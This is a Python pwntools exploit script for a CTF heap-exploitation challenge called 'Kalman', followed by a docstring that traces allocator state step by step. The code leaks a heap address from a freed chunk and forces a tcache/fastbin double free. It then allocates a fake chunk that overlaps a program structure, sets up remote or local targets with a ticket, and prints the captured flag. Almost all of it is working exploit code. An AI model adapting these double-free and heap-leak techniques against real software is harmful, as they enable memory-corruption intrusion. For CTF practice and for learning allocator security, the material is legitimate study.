#!/usr/bin/env python3

from pwn import *
import typing
import argparse as ap

context.log_level = 'debug'

class Interface():
    def __init__(self, io):
        io.recvuntil(b">")
        io.timeout = 10

        self.io = io

        self.total_allocated = len(self.list_measurements())

    def add_measurement(self, T : int, X : int, Y : int, Z : int) -> None:
        self.io.sendline(b"1")
        self.io.sendlineafter(b"Time (US)>\n", f"{T}".encode())
        self.io.sendlineafter(b"X>\n", f"{X}".encode())
        self.io.sendlineafter(b"Y>\n", f"{Y}".encode())
        self.io.sendlineafter(b"Z>\n", f"{Z}".encode())
        self.io.recvuntil(b"Choice>\n")

        self.total_allocated += 1

    def remove_first_measurement(self) -> None:
        self.io.sendline(b"2")
        self.io.recvuntil(b"Choice>\n")

        self.total_allocated -= 1

    def remove_last_measurement(self) -> None:
        self.io.sendline(b"3")
        self.io.recvuntil(b"Choice>\n")

        self.total_allocated -= 1

    def list_measurements(self, p=False) -> None:
        self.io.sendline(b"4")
        
        measurements = self.io.recvuntil(b"Choice>\n", drop=True)
        measurements = measurements.split(b"\n")

        measurements = [val for val in measurements if val.startswith(b"Raw Measurement") ]

        if p:
            for measurement in measurements:
                print(measurement)
            print()
        
        return measurements

    def run_sim(self) -> None:
        self.io.sendline(b"5")
        # time.sleep(5)
        output = self.io.recvuntil(b"Bye")

        return output

    def remove_n_measurements_front(self, n : int) -> None:
        for i in range(n):
            self.remove_first_measurement()
        
    def remove_n_measurements_back(self, n : int) -> None:
        for i in range(n):
            self.remove_last_measurement()
    
    def get_measurement_len(self) -> int:
        return len(self.list_measurements())

    def interactive(self):
        self.io.interactive()

    @staticmethod
    def split_measurement(measurement : typing.Union[str, bytes]) -> typing.Tuple[int, int, int, int]:
        if isinstance(measurement, str): measurement = measurement.encode()
        vals = measurement[measurement.index(b':'):].split(b" ")[1:]
        
        # return (int(vals[0]), float(vals[1]), float(vals[2]), float(vals[3]))
        return tuple([int(vals[0]), *[Interface.double_to_fixed(float(num)) for num in vals[1:]]])
    
    @staticmethod
    def float_to_hex(val: float):
        return int.from_bytes(struct.pack("d", val), "little")

    @staticmethod
    def fixed_to_double(val: float, fraction_bits: int=10) -> float:
        scalar = (2 << (fraction_bits - 1))

        return float(val / scalar)
    
    @staticmethod
    def double_to_fixed(val: float, fraction_bits: int=10) -> int:
        scalar = (2 << (fraction_bits - 1))

        return int(val * scalar)
    
def force_double_free(io : Interface):
    m_l = io.get_measurement_len()
    
    # Free everything   (7 tcache, 4 fastbins)
    io.remove_n_measurements_front(m_l)

    io.list_measurements(True)

    # Empty the t-cache
    for i in range(7):
        io.add_measurement(0,0,0,0)

    # Allocates a fastbin since t-cache is empty
    # This moves the remaining 3 fastbin chunks to the t-cache
    io.add_measurement(0,0,0,0)

    # Saturate the t-cache free list
    io.remove_n_measurements_back(4)

    # Add 4 values to the fastbins
    io.remove_n_measurements_back(4)

    ####
    # At this point the next chunk (last chunk in the list) is ready to be freed is currently 4th in line in the t-cache. Freeing here would fail
    # What we're going to do instead, is allocate everything in the t-cache so its empty, then allocate a single chunk from
    # the fastbin. This will move the remaining 3 fastbins chunks to the t-cache.
    # Now when we start freeing, that chunk that was 4th in line in the t-cache, will instead be freed into the fastbin.
    # That chunk is also the last chunk in the list, meaning there will be multiple chunks in between the first time we free it
    # and the second time
    #### 

    # Empty the t-cache again
    for i in range(7):
        io.add_measurement(0,0,0,0)
    
    # Allocates a fastbin since t-cache is empty
    # This moves the remaining 3 fastbin chunks to the t-cache
    io.add_measurement(0,0,0,0)

    allocated_chunks = io.total_allocated

    io.remove_n_measurements_back(allocated_chunks + 1)

def leak_free_chunk_addr(io : Interface) -> int:
    m_l = io.get_measurement_len()
    measurements = io.list_measurements()

    io.remove_n_measurements_back(m_l)

    # This measurement has our leaked heap address as its time field
    first_measurement = io.list_measurements()[0]

    # Restore original measurements
    for measurement in measurements:
        io.add_measurement(*Interface.split_measurement(measurement))

    return (Interface.split_measurement(first_measurement)[0])

def main(proc_io):
    io = Interface(proc_io)

    log.info("Leaking heap address...")
    # Run the debugger with NOASLR and copy the adress of these 3
    TopOfTheHeapAddrDebugger = 0x5555555b6000 # get this via vmmap heap (START) in pwndebug
    freeChunkAddrDebugger = 0x5555555cab40
    posVarianceAddrDebugger = 0x5555555c7ea0

    #
    bytesTopOfHeapToFreeChunk = freeChunkAddrDebugger - TopOfTheHeapAddrDebugger # Determined in debugger by hand
    bytesTopOfHeapToPosVariance = posVarianceAddrDebugger - TopOfTheHeapAddrDebugger # Determined in 
    #
    leakedAddrFreeChunk = leak_free_chunk_addr(io)

    #
    log.info( f"Leaked Addr Free Chunk: {hex(leakedAddrFreeChunk)}")
    topOfHeap = leakedAddrFreeChunk - bytesTopOfHeapToFreeChunk
    pos_variance_address = topOfHeap + bytesTopOfHeapToPosVariance 
    log.info( f"Calculated Top O The Heap: {hex(topOfHeap)}")
    log.info( f"Calculated Pos Variance Addr: {hex(pos_variance_address)}")

    #log.info(f"Heap Addr: {hex(heap_address)} | Position Variance Addr: {hex(heap_address)}\n")

    log.info("Triggering double free...")
    force_double_free(io)

    # Create chunk with forward pointer pointing to a fake chunk we control that also overlaps
    # another real chunk. From this we can control the size field of the real chunk we are overlapping, which then
    # allows us to free it. This puts the real chunk in the unsorted bin, which we can then read to leak libc address 

    # Heap spray size our chunk size
    start_time = 91000000
    for i in range(7):
        # This chunk gives us problems later when we malloc. It's because it gets
        # put back into the t-cache and we clobbered its fd and bk. We shouldn't do that

        # if io.total_allocated == 1:

        #     problem_chunk_fd, problem_chunk_bk = topOfHeap + 0x14d50, topOfHeap + 0x10
        #     io.add_measurement(problem_chunk_fd, problem_chunk_bk, 0, 0)
        #     continue
        
        io.add_measurement(start_time, 0, 0, 0)

        start_time += int(1E6)
        
        # io.add_measurement(0x00005555555f3d50, 0x00005555555df010, 0, 0)
        # else:
        #     io.add_measurement(0x41, 0x41, 0x41, 0x41)

    ## Create a fake chunk in the middle of a chunk then allow the fd and bk that the linked list writes to
    ## basically zero out the XX and YY variances (since the variance is a dobule)

    # df_fd_ptr = 0x5555555f3d70
    # This is the first allocation of our free chunk
    # df_fd_ptr = heap_address + 0x14d70
    df_fd_ptr = pos_variance_address + 0x10
    log.info(f"pos_variance_address: {hex(pos_variance_address)} | df_fd_ptr: {hex(df_fd_ptr)}")

    log.info("Making first allocation of free chunk pointing at posvariance chunk")
    # io.add_measurement(0x0, 0x0, 0x0, 0x0)
    io.add_measurement(df_fd_ptr, 0, 0, 0)

    # io.interactive()

    for _ in range ((7+1+1) - io.total_allocated):
        io.add_measurement(start_time,0,0,0)
        start_time += int(1E6)

    # io.interactive()

    # This allocation will be our fake chunk
    # We need to make sure our fd and bk pointers for the linked list doesn't get clobbered
    fake_chunk_fd, fake_chunk_bk = topOfHeap + 0x14b50, topOfHeap + 0x14c90

    log.info("Allocating chunk over posvariance")
    # io.add_measurement(0, 0, 0, 0)
    # io.add_measurement(fake_chunk_fd, fake_chunk_bk, 0xdeadbeef, 0x41)

    io.add_measurement(start_time, 0, 0, 0)

    output = io.run_sim()

    output = output.split(b'\n')

    for line in output:
        if line.startswith(b"flag"):
            print(f"Here is your flag: flag: {line}")
        
if __name__ == "__main__":
   
    parser = ap.ArgumentParser()
    parser.add_argument('--hostname', required=True)
    parser.add_argument('--port', required=True)
    parser.add_argument('--GDB', action='store_true')
    parser.add_argument('--LOCAL', action='store_true')
    args = parser.parse_args()
    # context.log_level = 'debug'
    proc_io = None

    gs = """
    set max-visualize-chunk-size 0x500
    continue
    """

    if args.GDB:
        os.chdir("../static/build")
        elf = context.binary = ELF("./Kalman")
        proc_io = gdb.debug(elf.path, gdbscript=gs)
    elif args.LOCAL:
        os.chdir("../static/build")
        elf = context.binary = ELF("./Kalman")
        proc_io = process(elf.path)
    else:
        proc_io = remote(args.hostname, args.port )
        ticket = os.getenv("TICKET")
        if ticket is not None:
            # Do a ticket submission
            proc_io.recvuntil(b"Ticket please:")
            proc_io.sendline( ticket )

    main(proc_io)


""" Explanation
0: Initial state
    TC[0]: 
    FB[0]: 
    
    MM[11]: (BACK) 0 <-> 1 <-> 2 <-> 3 <-> 4 <-> 5 <-> 6 <-> 7 <-> 8 <-> 9 <-> 10 (FRONT)
    
1: Free Everything (Popping front)
    TC[7]: 4 <-> 5 <-> 6 <-> 7 <-> 8 <-> 9 <-> 10
    FB[4]: 0 <-> 1 <-> 2 <-> 3
    
    MM[0]: (BACK) 0 <-> NULL (FRONT)

2: Malloc until t-cache is empty and we are ready to allocate from fastbins
    TC[0]:
    FB[4]: 0 <-> 1 <-> 2 <-> 3
    
    MM[7]: (BACK) 10 <-> 9 <-> 8 <-> 7 <-> 6 <-> 5 <-> 4 <-> 0 <-> NULL (FRONT)

3: Alloc a single chunk which has to be serviced from the fastbin (since t-cache is empty). This will move the three remaining chunks from the fastbins to the t-cache
    TC[3]: 1 <-> 2 <-> 3
    FB[0]: 
    
    MM[8]: (BACK) 0 <-> 10 <-> 9 <-> 8 <-> 7 <-> 6 <-> 5 <-> 4 <-> 0 <-> NULL (FRONT)

4: Free chunks until we reach our 0th chunk again (but don't free it). Now it's fourth in line in the T-cache
    TC[7]: 8 <-> 9 <-> 10 <-> 0 <-> 1 <-> 2 <-> 3
    FB[4]: 4 <-> 5 <-> 6 <-> 7
    
    MM[0]: (BACK) 0 <-> NULL (FRONT)

5: Free chunks until we reach our 0th chunk again (but don't free it). Now it's fourth in line in the T-cache
    TC[7]: 8 <-> 9 <-> 10 <-> 0 <-> 1 <-> 2 <-> 3
    FB[4]: 4 <-> 5 <-> 6 <-> 7
    
    MM[7]: (BACK) 0 <-> NULL (FRONT)

Note: If we freed the last chunk, it would be checked against all the t-cache chunks and the program would abort

6: Malloc until t-cache is empty and we are ready to allocate from fastbins (again)
    TC[0]:
    FB[4]: 4 <-> 5 <-> 6 <-> 7
    
    MM[7]: (BACK) 3 <-> 2 <-> 1 <-> 0 <-> 10 <-> 9 <-> 8 <-> 0 <-> NULL (FRONT)

7: Alloc a single chunk which has to be serviced from the fastbin (since t-cache is empty). This will move the three remaining chunks from the fastbins to the t-cache (again)
    TC[3]: 5 <-> 6 <-> 7
    FB[0]: 
    
    MM[8]: (BACK) 4 <-> 3 <-> 2 <-> 1 <-> 0 <-> 10 <-> 9 <-> 8 <-> 0 <-> NULL (FRONT)

8: Free until t-cache is full
    TC[7]: 1 <-> 2 <-> 3 <-> 4 <-> 5 <-> 6 <-> 7
    FB[0]: 
    
    MM[4]: (BACK) 0 <-> 10 <-> 9 <-> 8 <-> 0 <-> NULL (FRONT)

9: Now when we free, we'll free into the fastbins. And since we now have chunks in between the chunk we'd like to double free, we can perform the double free
    TC[7]: 1 <-> 2 <-> 3 <-> 4 <-> 5 <-> 6 <-> 7
    FB[0]: 0 <-> 8 <-> 9 <-> 10 <-> 0
    
    MM[0]: (BACK) NULL <-> NULL (FRONT)

Note: This also restores our list to a state where the FRONT and BACK pointer are both null. Meaning from here on out, our measurement list is no longer corrupted.

    TC[7]: 
    FB[0]: 8 <-> 9 <-> 10 <-> 0 <-> POS_VARIANCE

    MM: (BACK) 0 <-> 1 <-> 2 <-> 3 <-> 4 <-> 5 <-> 6 <-> 7 (FRONT)


ARENA:

TC: 0x400000 # POS_VARIANCE
FB(0x20): 0x80000000
FB(0x40): NULL

TC[1]:  <-> UKNOWN
FB[0]: 

0x0 0x41
FD  BK

MM: (BACK) POS_VARIANCE <-> 0 <-> 10 <-> 9 <-> 8 <-> 0 <-> 1 <-> 2 <-> 3 <-> 4 <-> 5 <-> 6 <-> 7 (FRONT)

"""